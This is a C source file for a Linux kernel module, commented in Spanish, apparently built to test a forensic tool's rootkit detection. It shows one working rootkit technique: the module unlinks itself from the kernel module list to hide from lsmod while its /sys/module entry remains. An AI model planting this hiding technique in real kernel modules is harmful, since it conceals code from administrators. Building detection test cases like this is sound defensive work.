// SPDX-License-Identifier: GPL-2.0
/*
 * Escenario VM4 - Rootkit LKM educativo (ocultación de módulo)
 * Módulo de ForensicXM probado: -k (rootkit)
 *
 * Este módulo demuestra UNA sola técnica de rootkit: la
 * ocultación de la lista de módulos. Al cargarse, se borra a sí
 * mismo de la lista enlazada que alimenta /proc/modules y lsmod,
 * PERO su directorio en /sys/module/ permanece. Esa discrepancia
 * es exactamente lo que detecta la "cross-view validation" de
 * ForensicXM (analizar_rootkits.c).
 *
 * NO oculta ficheros, NO oculta procesos, NO da escalada de
 * privilegios, NO abre puertas traseras. Es lo mínimo para
 * generar el indicador de compromiso que la herramienta busca.
 *
 * USAR SOLO EN LA VM DE PRUEBAS DESECHABLE. Con snapshot previo.
 * Tras cargarlo NO se puede descargar (rmmod) porque ya no está
 * en la lista: para "limpiar" se restaura el snapshot o se reinicia.
 *
 * Compilar:  make -f Makefile_rootkit
 * Cargar:    sudo insmod ocultador.ko
 * Verificar: lsmod | grep ocultador   (NO debe aparecer)
 *            ls /sys/module/ocultador (SÍ debe existir)
 * Detectar:  sudo ./bin/forensicXM -k
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/list.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("TFG - Pruebas ForensicXM");
MODULE_DESCRIPTION("Modulo de prueba: ocultacion de lista de modulos");
MODULE_VERSION("1.0");

static int __init ocultador_init(void)
{
    printk(KERN_INFO "[ocultador] Cargado. Ocultandome de /proc/modules...\n");

    /* Sacamos nuestra entrada de la lista enlazada de módulos.
     * Tras esto seguimos cargados y activos en el kernel, pero
     * lsmod / /proc/modules ya no nos ven. /sys/module/ocultador
     * sí permanece -> discrepancia detectable. */
    list_del_init(&THIS_MODULE->list);

    printk(KERN_INFO "[ocultador] Hecho. Soy invisible para lsmod.\n");
    return 0;
}

static void __exit ocultador_exit(void)
{
    /* En la práctica no se llega aquí: al estar fuera de la lista
     * el módulo no se puede descargar. Se deja por corrección. */
    printk(KERN_INFO "[ocultador] Descargado.\n");
}

module_init(ocultador_init);
module_exit(ocultador_exit);
